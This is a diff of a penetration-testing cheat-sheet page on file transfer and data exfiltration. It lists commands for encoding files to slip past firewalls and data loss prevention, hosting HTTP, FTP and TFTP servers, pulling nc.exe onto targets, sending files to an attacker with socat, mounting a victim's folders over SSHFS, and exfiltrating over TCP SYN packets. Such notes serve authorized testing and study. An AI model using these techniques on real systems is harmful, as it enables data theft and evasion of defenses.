@@ -10,35 +10,23 @@ Always ensure you have **explicit** permission to access any computer system **b
 Not much here yet...please feel free to contribute at [my GitHub page](https://github.com/zweilosec/Infosec-Notes).
 {% endhint %}
 
-* [https://book.hacktricks.xyz/exfiltration](https://book.hacktricks.xyz/exfiltration)
-* [https://awakened1712.github.io/oscp/oscp-transfer-files/](https://awakened1712.github.io/oscp/oscp-transfer-files/)
-* [https://blog.ropnop.com/transferring-files-from-kali-to-windows/](https://blog.ropnop.com/transferring-files-from-kali-to-windows/)
-* [https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin-examples](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin-examples)
-* [DNSFTP](https://github.com/breenmachine/dnsftp) - Get file with DNS requests&#x20;
-* [https://linuxhandbook.com/transfer-files-ssh/](https://linuxhandbook.com/transfer-files-ssh/)
-* [https://xapax.github.io/security/#transferring\_files/transfering\_files/](https://xapax.github.io/security/#transferring\_files/transfering\_files/)
-* [https://xapax.github.io/security/#attacking\_active\_directory\_domain/good\_to\_know/transferring\_files/](https://xapax.github.io/security/#attacking\_active\_directory\_domain/good\_to\_know/transferring\_files/)
+The first step to exfiltration is to avoid being caught.  This means avoiding firewalls, data loss prevention, email filters, and more.  Encoding/encrypting your payload is a good way to do this.
 
-</details>
-
-## Encode a file
-
+## Preparing files for transport
 
 {% tabs %}
 {% tab title="base64" %}
-```
-base64 -w0 <file> #Encode file
-base64 -d file #Decode file
-```
-{% endtab %}
+Base64 encode a file
 
-{% tab title="certutil" %}
-```
-certutil -encode payload.dll payload.b64
-certutil -decode payload.b64 payload.dll
+```bash
+base64 -w0 $file
 ```
 
+Base64 decode a file
 
+```bash
+base64 -d $file
+```
 {% endtab %}
 
 {% tab title="uuencode" %}
@@ -66,7 +54,6 @@ end
 {% endtab %}
 
 {% tab title="openssl" %}
-
 Openssl can also be used to encode files for transport
 
 Encode:
@@ -80,8 +67,6 @@ Cut & paste the output then transfer and decode:
 ```
 $ openssl base64 -d > passwd-COPY
 ```
-
-
 {% endtab %}
 
 {% tab title="xxd" %}
@@ -98,26 +83,31 @@ Cut & paste the output into this command: Decode:
 ```
 $ xxd -p -r passwd-COPY
 ```
-
 {% endtab %}
 
 {% tab title="Compression" %}
-Method 1: Using `shar` to create a self extracting shell script, which is in text format and can be copied/mailed:
+### shar
 
-* https://linux.die.net/man/1/shar
+Use `shar` to create a self-extracting shell script, which is in text format and can be copied/mailed:
+
+* [https://linux.die.net/man/1/shar](https://linux.die.net/man/1/shar)
 
 ```
 shar *.py *.c > exfil.shar
 ```
 
-Transfer _exfil.shar_ to the remote system by any means and execute it:
+Transfer _**exfil.shar**_ to the remote system by any means and execute it:
 
 ```
-chmod 700 exfil.shar
+chmod +x exfil.shar
 ./exfil.shar
 ```
 
-Method 2: Using `tar`
+###
+
+### tar
+
+A tar file is similar to a standard zip archive
 
 ```
 tar cfz - *.py *.c | openssl base64 > exfil.tgz.b64
@@ -128,7 +118,6 @@ Transfer _exfil.tgz.b64_ to the remote system and decode:
 ```
 openssl base64 -d < exfil.tgz.b64 | tar xfz -
 ```
-
 {% endtab %}
 {% endtabs %}
 
@@ -140,28 +129,17 @@ One of the easier ways to transfer a file as most devices have web access. Start
 # find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \;
 ```
 
-{% tabs %}
-{% tab title="Wget" %}
-
 ```
 # wget http://<url> -O url.txt -o /dev/null
 ```
 
-{% endtab %}
-
-{% tab title="Curl" %}
-Curl has the benefit of being able to transfer with IMAP, POP3, SCP, SFTP, SMB, SMTP, TELNET, TFTP< and other protocols.
-Experimentation may be needed to figure out what is blocked/allowed by the firewall.
+Curl has the benefit of being able to transfer with IMAP, POP3, SCP, SFTP, SMB, SMTP, TELNET, TFTP< and other protocols. Experimentation may be needed to figure out what is blocked/allowed by the firewall.
 
 ```
 # curl -o file.txt http://url.com
 ```
 
-{% endtab %}
-
-{% tab title="HTTP Servers" %}
-
-## Scripted HTTP Servers
+### Scripted HTTP Servers
 
 ```
 python2 -m SimpleHTTPServer $port
@@ -172,8 +150,6 @@ php -S 0.0.0.0:8888
 
 [SimpleHTTPServerWithUpload](https://gist.github.com/UniIsland/3346170)
 
-
-{% tab title="HTTPS Server" %}
 ```
 # from https://gist.github.com/dergachev/7028596
 # taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
@@ -192,16 +168,11 @@ httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_si
 httpd.serve_forever()
 ```
 
-{% endtab %}
-{% endtabs %}
-
 ## FTP
 
 {% tabs %}
 {% tab title="Python" %}
-
-
-## Python FTP server
+### Python FTP server
 
 ```bash
 #!/usr/bin/env python3
@@ -252,7 +223,6 @@ You can also use the pyftplib module to quickly and easily set up ftp
 #pip3 install pyftpdlib
 #python3 -m pyftpdlib -p 21
 ```
-
 {% endtab %}
 
 {% tab title="NodeJS" %}
@@ -263,7 +233,6 @@ ftp-srv ftp://0.0.0.0:9876 --root /tmp
 {% endtab %}
 
 {% tab title="Pure-FTP" %}
-
 ```
 # sudo apt update && sudo apt install pure-ftpd
 ```
@@ -282,7 +251,6 @@ mkdir -p /ftphome
 chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart
 ```
-
 {% endtab %}
 {% endtabs %}
 
@@ -295,6 +263,7 @@ sudo apt update && sudo apt install atftp
 ```
 
 Download with TFTP
+
 ```bash
 # In Kali 
 atftpd --daemon --port 69 /tftp
@@ -304,6 +273,7 @@ tftp -i 10.10.10.10 GET nc.exe
 ```
 
 Upload with TFTP
+
 ```
 sudo mkdir /tftp
 sudo chown nobody: /tftp
@@ -313,8 +283,7 @@ tftp -i 10.11.0.4 put exfil.zip
 
 ## SCP
 
-SCP tranfsers files through SSH
-See [SCP section](https://github.com/zweilosec/Infosec-Notes/blob/master/os-agnostic/ssh-and-scp.md#scp) for more.
+SCP tranfsers files through SSH See [SCP section](../../os-agnostic/ssh-and-scp.md#scp) for more.
 
 ```
 Get file
@@ -423,8 +392,7 @@ python3 -m http.server 8099  -d .
 
 {% tabs %}
 {% tab title="Socat" %}
-
-## Socat
+### Socat
 
 ```bash
 #to attacker
@@ -434,12 +402,10 @@ socat TCP4:$IP:$port file:$filename,create
 ```
 
 `sudo` is necessary if the port is under 1024. `fork` allows for multiple connections.
-
 {% endtab %}
 
 {% tab title="SSHFS" %}
-
-## SSHFS
+### SSHFS
 
 If the victim has SSH, the attacker can mount a directory from the victim to the attacker.
 
@@ -448,7 +414,6 @@ sudo apt install sshfs
 sudo mkdir /mnt/sshfs
 sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
 ```
-
 {% endtab %}
 {% endtabs %}
 
@@ -461,5 +426,16 @@ We can use TCP SYN sequence number packets to exfiltrate data using the `syn-fil
 ```
 
 * [https://github.com/defensahacker/syn-file](https://github.com/defensahacker/syn-file)
+
+## Resources
+
+* [https://book.hacktricks.xyz/exfiltration](https://book.hacktricks.xyz/exfiltration)
+* [https://awakened1712.github.io/oscp/oscp-transfer-files/](https://awakened1712.github.io/oscp/oscp-transfer-files/)
+* [https://blog.ropnop.com/transferring-files-from-kali-to-windows/](https://blog.ropnop.com/transferring-files-from-kali-to-windows/)
+* [https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin-examples](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin-examples)
+* [DNSFTP](https://github.com/breenmachine/dnsftp) - Get file with DNS requests
+* [https://linuxhandbook.com/transfer-files-ssh/](https://linuxhandbook.com/transfer-files-ssh/)
+* [https://xapax.github.io/security/#transferring\_files/transfering\_files/](https://xapax.github.io/security/#transferring\_files/transfering\_files/)
+* [https://xapax.github.io/security/#attacking\_active\_directory\_domain/good\_to\_know/transferring\_files/](https://xapax.github.io/security/#attacking\_active\_directory\_domain/good\_to\_know/transferring\_files/)
 
 If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
